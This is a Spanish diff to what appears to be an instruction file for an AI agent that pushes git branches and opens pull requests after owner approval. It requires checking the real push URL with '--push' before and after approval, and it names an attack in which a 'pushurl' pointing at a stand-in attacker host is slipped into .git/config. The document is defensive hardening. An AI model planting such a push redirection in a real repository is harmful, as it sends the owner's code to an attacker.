@@ -138,11 +138,23 @@ corporativo), NO lo arregles y NO lo escondas: la línea ya lo hace visible, y q
 owner (ruling 14).
 
 Si hay varios remotos, usa el del `approved-push:` en fase B; en fase A, usa `origin` si existe y si
-no el PRIMERO que liste `git remote -v`, y dilo explícitamente en la línea `- remote:` para que el
-owner lo vea antes de aprobar. Esa línea lleva NOMBRE y URL exactos (`origin →
-git@github.com:owner/repo.git`), tal cual los imprime `git remote -v` — es el dato que la raíz
-traduce al campo `url=` de `approved-push:` (ver "Gate de aprobación" de fase B), así que no lo
-reformatees ni lo abrevies.
+no el PRIMERO que liste `git remote -v`.
+
+Con el `<remote>` ya elegido, pide su URL de PUSH con una llamada dedicada — **nunca la leas del
+listado de `git remote -v` de arriba, y nunca uses `git remote get-url <remote>` a secas**:
+
+```bash
+git remote get-url --push origin
+```
+(cuenta para `cmds=`; sustituye `origin` por `<remote>`). La razón no es de estilo: cuando el remoto
+tiene configurado `remote.<remote>.pushurl`, `git remote get-url` SIN `--push` (y cada línea `(fetch)`
+de `git remote -v`) devuelve la URL de FETCH, que puede ser DISTINTA de a dónde va un `git push` de
+verdad — `pushurl`, cuando existe, es la única URL que `git push` usa. Mostrar la de fetch en el
+preview y aprobar sobre ella sería aprobar un destino que no es el real. La línea `- remote:` lleva el
+nombre y esa URL de push, tal cual la devuelve el comando —sin marcador `(push)`/`(fetch)`, sin
+reformatear, sin abreviar—: `- remote: origin → git@github.com:owner/repo.git`. Es el dato que la
+raíz traduce, sin tocarlo, al campo `url=` de `approved-push:` (ver "Gate de aprobación" de fase B) —
+y es también, más abajo, la URL que decide si el host es GitHub para `gh pr create`.
 
 ### 3. Rama actual y rama base
 
@@ -249,7 +261,7 @@ texto, y el owner tiene que poder leerlo entero antes de que nada salga de su m�
 
 ```
 DONE
-evidence: files=2 cmds=6 turns=7/15
+evidence: files=2 cmds=7 turns=7/15
 - remote: origin → git@github.com:owner/repo.git
 - commits: 4 (master..feature/export-csv)
 - verde: php vendor/bin/phpunit OK
@@ -294,14 +306,19 @@ el mundo real AHORA, no el de hace dos minutos — el owner pudo cambiar de rama
 remoto pudo cambiar de URL por CUALQUIER vía, no solo las que este dominio ejecuta:
 
 - `git rev-parse --abbrev-ref HEAD` debe imprimir exactamente el `branch=` aprobado;
-- el `remote=` aprobado debe existir Y su URL debe casar EXACTAMENTE, carácter a carácter, con el
-  `url=` aprobado:
+- el `remote=` aprobado debe existir Y su URL de PUSH debe casar EXACTAMENTE, carácter a carácter, con
+  el `url=` aprobado — **usa `--push`, nunca `git remote get-url <remote>` a secas**:
   ```bash
-  git remote get-url origin
+  git remote get-url --push origin
   ```
   (cuenta para `cmds=`; sustituye `origin` por el remoto aprobado). Compara la salida literal contra
   el `url=` de tu cabecera — sin normalizar ni recortar nada (`git@github.com:o/r.git` y
-  `git@github.com:o/r` no son la misma cadena aunque git los resuelva igual).
+  `git@github.com:o/r` no son la misma cadena aunque git los resuelva igual). El `--push` no es
+  opcional: si el remoto tiene configurado `remote.<remote>.pushurl`, esa es la URL que `git push` usa
+  DE VERDAD, y puede ser distinta de la de fetch (`git remote get-url` sin `--push` la devolvería, y
+  la re-verificación compararía la URL equivocada — comparando bien pero contra el dato que no
+  importa). Fase A ya obtuvo la URL de push con la misma flag (ver "2. Remoto configurado"), así que
+  ambos lados de la comparación son la misma clase de dato.
 - el `base=` aprobado no puede ser igual al `branch=`;
 - el `branch=` no puede ser `master`/`main`/`develop`/`trunk`.
 
@@ -309,10 +326,16 @@ remoto pudo cambiar de URL por CUALQUIER vía, no solo las que este dominio ejec
 solía nombrar solo `remote=`/`branch=`/`base=`, así que la re-verificación confirmaba que el
 `remote=` aprobado EXISTÍA, pero no que su URL siguiera siendo la que el owner vio en el preview de
 fase A (fase B es una invocación fresca, sin memoria de esa URL). El campo `url=` cierra ese hueco por
-completo: la URL pudo cambiar no solo por `git remote set-url` (denegado por el guard para todo
-agent_type), sino por cualquier edición humana directa de `.git/config` en la máquina entre fase A y
-fase B — algo que ningún guard de comandos puede ver porque no pasa por ningún shell. Comparar contra
-el `url=` de la cabecera detecta el cambio sea cual sea su vía.
+completo: la URL de push pudo cambiar no solo por `git remote set-url` (denegado por el guard para
+todo agent_type), sino por cualquier edición humana directa de `.git/config` en la máquina entre fase
+A y fase B — algo que ningún guard de comandos puede ver porque no pasa por ningún shell. El caso más
+afilado de ese "cualquier edición" es añadir una línea `pushurl = git@evil.example.com:...` al bloque
+del remoto: `git remote -v` y `git remote get-url` sin `--push` siguen mostrando la URL de fetch de
+siempre —benigna, sin cambios— mientras el push real se va a otro sitio. Por eso la comparación tiene
+que ser SIEMPRE contra `git remote get-url --push` en los dos lados (fase A y fase B): comparar la URL
+de fetch aquí demostraría que la URL de fetch no cambió, que es una propiedad distinta de la que
+`url=` existe para garantizar. Comparar contra el `url=` de la cabecera —de push, siempre— detecta el
+cambio sea cual sea su vía.
 
 Cualquier discrepancia → `BLOCKED aprobación no coincide con el estado real` con una línea
 `- discrepancia: <campo> aprobado <x>, real <y>` — incluida `- discrepancia: url aprobada <x>, real
@@ -336,8 +359,11 @@ siguiente).
 
 ### PR (degradación honesta si no hay `gh`, o si el remoto no es GitHub)
 
-**Primero mira la URL del remoto** (la que ya obtuviste en la re-verificación, `git remote get-url`,
-no vuelvas a pedirla). **Si NO contiene `github.com`**, `gh pr create` está condenado a fallar —
+**Primero mira la URL del remoto** (la de PUSH que ya obtuviste en la re-verificación con
+`git remote get-url --push`, no vuelvas a pedirla ni uses otra). Es la misma URL adonde el `git push`
+de más arriba acaba de empujar de verdad, así que el chequeo de host y el push están de acuerdo sobre
+qué URL es la que manda — comprobar aquí la de fetch podría enrutar el PR a `github.com` mientras el
+push real fue a otro host. **Si NO contiene `github.com`**, `gh pr create` está condenado a fallar —
 `gh` es un CLI de GitHub, no genérico — así que ni lo intentas: te ahorras una llamada (`gh` puede
 ni estar instalado en ese caso) y vas directo a la degradación de host-genérico de más abajo, sin
 pasar por el `gh auth status` que sigue.
@@ -428,6 +454,13 @@ los que hay configurados. Reescribir en silencio la configuración de git del ow
 error claro con una pista; la decisión, y el comando que la ejecuta, siguen siendo del owner. No lees
 ningún otro fichero bajo `~/.ssh/` (ninguna clave privada, ningún `known_hosts`): solo `~/.ssh/config`,
 y solo para nombrar alias, nunca para decidir por él.
+
+Los alias que extraes son texto AJENO —vienen de un fichero local, no de nada que tú hayas escrito—,
+así que si alguna vez se interpolan en cualquier `--text`/`--line` de shell (por ejemplo si
+`delivery-orchestrator` o la raíz reenvían tu línea `- alias candidatos:` a un comando real), pasan
+por el saneado de §4.4 antes de nombrarlo, igual que cualquier otro texto ajeno de este proyecto — no
+por lo que parezca "inofensivo" (un nombre de alias también puede llevar comillas o backticks), sino
+por la misma regla general de §4.4.
 
 ## Operación `configure-remote` — el bootstrap del remoto
 
